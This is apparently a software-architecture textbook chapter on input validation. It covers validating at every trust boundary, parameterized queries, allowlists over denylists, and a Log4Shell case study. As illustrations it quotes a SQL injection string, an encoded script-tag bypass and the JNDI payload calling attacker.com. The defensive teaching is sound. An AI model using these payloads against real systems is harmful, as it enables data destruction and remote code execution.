# Ch 81 — Input Validation

**Prerequisites:** [Error Handling Contracts](../part03-api-design/ch21-error-handling-contracts.md) (structured error responses), [Defense in Depth](ch80-defense-in-depth.md) (layered, independently failing controls), [Logging: What to Log and at What Level](../part09-observability/ch69-logging-what-to-log-and-at-what-level.md) (Log4Shell forward reference), [Threat Modeling](ch79-threat-modeling.md) (trust boundaries, attack surface)

**New vocabulary introduced:** injection, parameterization, allowlist validation, denylist validation

**Key takeaways:**
- Data becomes dangerous only once software assigns it meaning. A SQL engine interprets SQL; a shell interprets commands; a template engine interprets expressions. **Injection** is the same architectural mistake recurring across every one of these interpreters: untrusted input is concatenated into a string the interpreter then executes, instead of being kept strictly as data.
- [Strong Recommendation] Validate at every trust boundary a request crosses, not only once at the system's outer edge — the code-level instance of Ch 80's defense-in-depth argument. A downstream service that assumes an upstream gateway already validated everything has exactly one control standing between it and a bypass of that gateway.
- [Consensus] **Parameterization** is the correct fix for injection, not pattern-matching or blocklisting known-bad input. A blocklist can only ever cover attack patterns someone has already thought of; parameterization removes the interpreter's ability to treat supplied data as anything other than data, structurally, regardless of what it contains.
- [Strong Recommendation] **Allowlist validation** — accept only input matching a known-good shape — is generally stronger than **denylist validation** — reject known-bad patterns — because the set of legitimate inputs is small and stable while the set of malicious variants is unbounded and adversarially evolving.
- Log4Shell (CVE-2021-44228) is this chapter's anchor: despite being described as a logging vulnerability, it was structurally a missing-validation defect — an attacker-controlled string reached an interpreter capable of acting on it before anything checked whether it was safe to.

---

An HTTP request is an inert sequence of bytes until something decides what those bytes mean. The moment an interpreter — a SQL engine, a shell, a template renderer, a browser's HTML parser, an LDAP client — treats untrusted input as an instruction rather than a value, the system has handed control of its own behavior to whoever supplied that input. Input validation is the control that keeps that handoff from happening: verifying that data crossing into a more-trusted context actually conforms to what the receiving component expects, before any meaningful processing occurs. It answers one question — *is this data structurally safe to process* — and deliberately not a second one: whether the caller supplying it is allowed to make this request at all, which is Ch 82's subject.

### Decision: Validate at Every Trust Boundary, or Only at the System Perimeter

**What it is:** Whether every component independently validates its own inputs at every point a trust boundary is crossed, or validation happens once at the system's outermost edge and everything behind it trusts that data has already been checked.

**Why it exists:** Ch 80 already established that defense in depth assumes any individual control eventually fails or is bypassed. Validation-only-at-the-perimeter violates that assumption directly: if the one validating layer is bypassed — a compromised intermediary, a misconfigured gateway, a new internal caller nobody added a check for — every downstream component inherits fully untrusted data while behaving as though it's already been verified. Validation is defense in depth's code-level instance: each boundary should independently verify the assumptions it depends on rather than inheriting trust from whatever validated the data last.

**Options:**
- **Validate at every trust boundary** — every component checks its own inputs, even data forwarded from another internal, already-authenticated service.
- **Validate once at the perimeter** — an API gateway or edge layer performs the only validation; internal services trust everything that reaches them.

**Trade-offs:** Validating at every boundary limits blast radius and keeps each service independently robust at the cost of some duplicated logic and a small amount of repeated runtime overhead — a cost that is deliberate, not accidental, in the same way independent layers in Ch 80 deliberately repeat verification. Perimeter-only validation avoids that duplication and is cheaper to build initially, but it recreates the exact single-point-of-failure problem Ch 80 argued against: bypass the one validating layer, and nothing downstream has any reason to notice.

**When to choose each:** [Strong Recommendation] Validate independently at every boundary where assumptions change, including internal service-to-service calls that originate from another trusted component — trust should not propagate automatically just because something upstream already accepted the data. Perimeter-only validation is a starting point for a system with no meaningful internal trust boundaries yet, not a stable end state for anything with more than one internal component.

**Common failure modes:** Validating HTTP requests carefully while trusting message-queue payloads completely, on the assumption that only "trusted" internal producers publish to the queue; skipping validation on administrative interfaces because they're assumed to be reached only by authorized operators; a microservice that accepts a gateway's upstream validation as a substitute for checking its own required fields, ranges, and formats.

**Example:** A microservice receiving requests from an API gateway still validates required fields, value ranges, and formats itself, rather than assuming the gateway already rejected every malformed request — the gateway's validation and the service's validation are independent controls, not one control checked twice.

### Decision: Enforce Structural Parameterization, or Rely on Defensive Cleansing

**What it is:** Whether untrusted data is kept structurally separate from executable syntax at the interpreter level — parameterization — or a string containing both instructions and untrusted data is scanned, escaped, or filtered before being handed to the interpreter as one concatenated whole — cleansing.

**Why it exists:** Every injection vulnerability, regardless of which interpreter it targets, shares one root cause: an interpreter receives a single string where developer-written instructions and user-controlled data are intermingled, and the interpreter has no way to tell them apart. Cleansing tries to solve this by recognizing and neutralizing dangerous characters or patterns before concatenation — an algorithmic contest against every encoding and parser quirk an attacker might find, refought forever. Parameterization sidesteps the contest: the interpreter compiles the instruction structure first, entirely separately from the data values, so supplied data can never be read as anything but data. This is Principle 8 — mechanical enforcement over human discipline — applied to injection specifically.

**Options:**
- **Structural parameterization** — prepared statements, parameterized queries, or any API that enforces a hard separation between execution tokens and data values at the protocol level.
- **Defensive cleansing** — escaping, pattern matching, or blocklisting specific characters or sequences within a single concatenated string.

**Trade-offs:** Parameterization eliminates the relevant attack surface structurally — the interpreter cannot execute what it never receives as instructions — at the cost of requiring driver or API support, and it can make highly dynamic query construction (parameterizing a table or column name, for instance, which prepared statements don't support) less straightforward. Cleansing is flexible and works against interpreters with no native parameterization support at all, but its correctness depends entirely on the escaping routine anticipating every way the downstream interpreter's parser can be tricked — a contest cleansing is structurally positioned to lose, since it has to anticipate every future encoding trick and the interpreter only has to accept one it didn't.

**When to choose each:** [Consensus] Parameterized APIs wherever they exist — database queries, at minimum, and any other interpreter that offers a native separation of code from data. Reserve cleansing for interpreters with no parameterization mechanism at all, and treat it there as a secondary layer, not the primary defense.

**Common failure modes:** Building SQL through string concatenation and then escaping quotation marks as the sole defense; assuming quotes are the only character that matters and missing comments, keywords, or alternate encodings a specific interpreter also treats specially; the parser differential, where an application's escaping function and the downstream interpreter's actual parser disagree about which characters are dangerous — a shell that interprets a Unicode lookalike or a backtick the escaping routine never accounted for lets an attacker break out of the intended string literal entirely.

**Example:** PostgreSQL's extended query protocol splits execution into distinct Parse, Bind, and Execute phases: the query structure is compiled with placeholders (`$1`, `$2`) before any user-supplied value is transmitted, and the actual values arrive afterward as a separate binary payload. A value containing `'; DROP TABLE users; --` is bound as a literal byte sequence during Bind — the engine has already fixed the query's structure and has no remaining mechanism to reinterpret the payload as SQL, regardless of its contents.

### Decision: Prefer Allowlist Validation Over Denylist Pattern Matching

**What it is:** Whether validation defines what input is explicitly allowed — a specific format, a bounded length, a constrained character set — or what input is explicitly forbidden, rejecting only patterns already identified as dangerous.

**Why it exists:** The set of legitimate inputs for a given field is usually small and stable: engineers generally know exactly what a UUID, a postal code, or a SHA-256 digest should look like. The set of malicious inputs is neither small nor stable — it's whatever an adversary invents next, including encodings and obfuscations nobody has seen yet. A denylist has to anticipate that unbounded, adversarially evolving set in advance; an allowlist only has to correctly describe what the system already intends to accept.

**Options:**
- **Allowlist validation** — reject anything that doesn't match a defined, known-good shape.
- **Denylist validation** — accept everything except input matching a known-bad signature or pattern.

**Trade-offs:** Allowlists produce a smaller, more stable rule set that's resistant to attack variants nobody has invented yet, at the cost of requiring a real understanding of the legitimate input space and needing updates when that space legitimately expands. Denylists are easy to start and can flag known abuse patterns cheaply, but the list is never complete, needs continuous maintenance as new bypass techniques surface, and is trivially defeated by anything — an alternate encoding, an obfuscation — the list's author didn't anticipate.

**When to choose each:** [Strong Recommendation] Allowlists at every point where legitimate input has a definable structure: a bounded length, a specific format, an enumerated set of valid values. Denylists are defensible only as a supplemental detection signal layered on top of an allowlist — flagging known attack campaigns for observability — never as the sole or primary validation gate.

**Common failure modes:** *The encoding bypass.* An application denylists the literal string `<script>`. An attacker submits a double-URL-encoded (`%253Cscript%253E`) or HTML-entity-encoded variant; the denylist scans the raw input, finds no literal match, and passes it through — the downstream browser decodes it during rendering and executes the script the denylist never saw. Also common: blocking a handful of SQL keywords while missing equivalent syntax; treating a passed denylist check as comprehensive protection rather than one weak, supplemental signal.

**Example:** Accepting only uppercase hexadecimal characters of the correct fixed length for a SHA-256 digest is substantially more robust than attempting to enumerate and reject every malicious character sequence that isn't a valid digest.

### Why Smart Engineers Disagree on Where Validation Logic Should Live

The disagreement here is not about whether to validate. It's about where validation logic physically belongs: immediately at the I/O deserialization boundary, or deep inside the domain model the data eventually flows into.

Engineers optimizing for fail-fast behavior and containment argue for comprehensive validation the moment a payload crosses the network boundary — using schema libraries to check type correctness, length constraints, and format before a single line of business logic runs. Parsing unvalidated data deep into internal service memory, in this view, is exactly the anti-pattern Ch 80's containment argument warns against: it needlessly exposes internal application layers to malformed input that should never have gotten that far.

Engineers optimizing for domain cohesion view exhaustive edge validation with more suspicion. A field can pass every boundary check for type and length and still be wrong in a way only the domain can see — a withdrawal amount that's a well-formed positive integer but exceeds the account's actual balance. Splitting validation rules across an edge schema and the domain model that duplicates a subset of that same reasoning invites exactly the kind of drift Ch 20's resource-modeling discipline warns about: two definitions of "valid" that quietly diverge as the system evolves.

The resolution is that "validation" is doing two different jobs under one name. Syntactic validation — structural shape, encoding, type, size limits — belongs at the I/O boundary, insulating every downstream interpreter from physically malformed input. Semantic validation — business rules, relationships between fields, anything that requires state to evaluate — belongs in the domain model, where the context needed to evaluate it actually lives. Neither position is wrong about its own layer; the mistake is arguing about which one is "real" validation instead of recognizing they answer different questions.

### Case Study: Log4Shell (CVE-2021-44228)

This resolves Ch 69's deferred forward reference: Log4Shell is described almost universally as a logging vulnerability, but architecturally it was an input-validation defect, not a logging or secrets-management failure (Ch 83's subject).

```
[Attacker]
   │  HTTP header: ${jndi:ldap://attacker.com/exploit}
   ▼
[Application trust boundary — no validation gate]
   │  string passed through unchanged
   ▼
[Log4j2 — StrSubstitutor / JNDI lookup]
   │  evaluates the string as an expression, not data
   ▼
[Attacker-controlled LDAP server] → remote class loaded and executed
```

Applications routinely logged attacker-controlled strings — an HTTP header, a chat message — without validating them first. That string reached Log4j2's message-lookup interpreter, which was configured to evaluate `${...}` expressions rather than treat the whole string as inert text. The `${jndi:ldap://...}` sequence triggered an outbound JNDI lookup against an attacker-controlled server, which returned a Java class the JVM deserialized and executed — full remote code execution, from a value that never should have been treated as anything but a string to write to a file.

The defect was a missing validation step on untrusted input before it reached an interpreter capable of acting on it, structurally identical to SQL injection or command injection with a different interpreter on the receiving end. A strict allowlist at the boundary — rejecting header values containing expression syntax the application never intended to evaluate — would have neutralized the payload before it ever reached the logger. So would disabling the interpreter's dynamic lookup behavior by default. Either fix addresses the actual defect; treating this as a logging problem to be solved with better log hygiene addresses neither.

Validation failures still need to be reported to the caller, and that shape is not this chapter's decision to make — a rejected input returns the structured error response and 4xx classification Ch 21 already established, with no additional format invented here.
